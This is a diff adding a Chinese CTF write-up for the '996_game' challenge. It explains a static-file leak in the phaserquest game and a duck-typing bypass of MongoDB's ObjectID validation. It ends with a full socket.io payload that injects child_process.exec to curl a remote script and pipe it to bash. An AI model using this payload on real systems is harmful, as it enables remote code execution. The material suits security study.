@@ -14,6 +14,7 @@
 + https://xz.aliyun.com/t/5006
 + https://www.anquanke.com/post/id/177582
 + https://www.anquanke.com/post/id/177596
++ https://www.secpulse.com/archives/105333.html
 
 # 本站备份WP:
 原文来自[安全客](https://www.anquanke.com/post/id/177490)、原文作者[安胜ANSCEN];
@@ -297,6 +298,112 @@ I am sorry for that `sandbox.php` is basically no use, so this challenge can be 
 ![](https://p2.ssl.qhimg.com/t0110ca824de1ca4a60.png)
 
 ![](https://p2.ssl.qhimg.com/t0167be36999f5879f5.png)
+
+### 996_game
+
+首先我们找到藏着HTML源码里的提示：
+
+![](https://cy-pic.kuaizhan.com/g3/ad/ff/6639-fc2c-42e6-a6cf-80dc14f5ef6128)
+
+这是一个开源的HTML5游戏
+
+https://github.com/Jerenaux/phaserquest
+
+我们可以看到这里有个静态文件泄露漏洞
+
+https://github.com/Jerenaux/phaserquest/blob/master/server.js#L44
+
+```javascript
+app.use('/css',express.static(__dirname + '/css'));
+app.use('/js',express.static(__dirname + '/js'));
+app.use('/assets',express.static(__dirname + '/assets'));
+```
+![](https://cy-pic.kuaizhan.com/g3/50/a8/5c5f-957a-4714-87f8-c7b36e9312bd56)
+
+现在，我们需要找到一个方式使mongodb数据库报错
+
+这里我们唯一可以控制的点是id,所以我们一个去跟踪`ObjectId()`函数。
+
+https://github.com/mongodb/js-bson/blob/V1.0.4/lib/bson/objectid.js#L28
+
+```javascript
+...
+
+var valid = ObjectID.isValid(id);
+
+...
+
+ObjectID.isValid = function isValid(id) {
+  if(id == null) return false;
+
+  if(typeof id == 'number') {
+    return true;
+  }
+
+  if(typeof id == 'string') {
+    return id.length == 12 || (id.length == 24 && checkForHexRegExp.test(id));
+  }
+
+  if(id instanceof ObjectID) {
+    return true;
+  }
+
+  if(id instanceof _Buffer) {
+    return true;
+  }
+
+  // Duck-Typing detection of ObjectId like objects
+  if(id.toHexString) {
+    return id.id.length == 12 || (id.id.length == 24 && checkForHexRegExp.test(id.id));
+  }
+
+  return false;
+};
+
+```
+我们可以使用 `id = {"id":{"length":12}}` 来绕过这里.
+
+```javascript
+...
+
+  if(!valid && id != null){
+    throw new Error("Argument passed in must be a single String of 12 bytes or a string of 24 hex characters");
+  } else if(valid && typeof id == 'string' && id.length == 24 && hasBufferType) {
+    return new ObjectID(new Buffer(id, 'hex'));
+  } else if(valid && typeof id == 'string' && id.length == 24) {
+    return ObjectID.createFromHexString(id);
+  } else if(id != null && id.length === 12) {
+    // assume 12 byte string
+    this.id = id;
+  } else if(id != null && id.toHexString) {
+    // Duck-typing to support ObjectId from different npm packages
+    return id;
+  } else {
+    throw new Error("Argument passed in must be a single String of 12 bytes or a string of 24 hex characters");
+  }
+...
+```
+现在，我们的payload变成了：`id = {"length":0,"toHexString":true,"id":{"length":12}},`
+
+完整的payload将会发送到mongodb服务器上。
+
+```javascript
+MongoDB shell version: 2.6.10
+connecting to: test
+> db.a.find({"b":{"$gt":1,"c":"d"}})
+error: {
+	"$err" : "Can't canonicalize query: BadValue unknown operator: c",
+	"code" : 17287
+}
+
+```
+
+完整的payload如下
+
+```javascript
+Client.socket.emit('init-world',{new:false,id:{"$in":[1],"require('child_process').exec('/usr/bin/curl host/shell2|bash')":"bbb","length":0,"toHexString":true,"id":{"length":12}},clientTime:"sacsaccsacsac"});
+```
+
 
 ## REVERSE
 
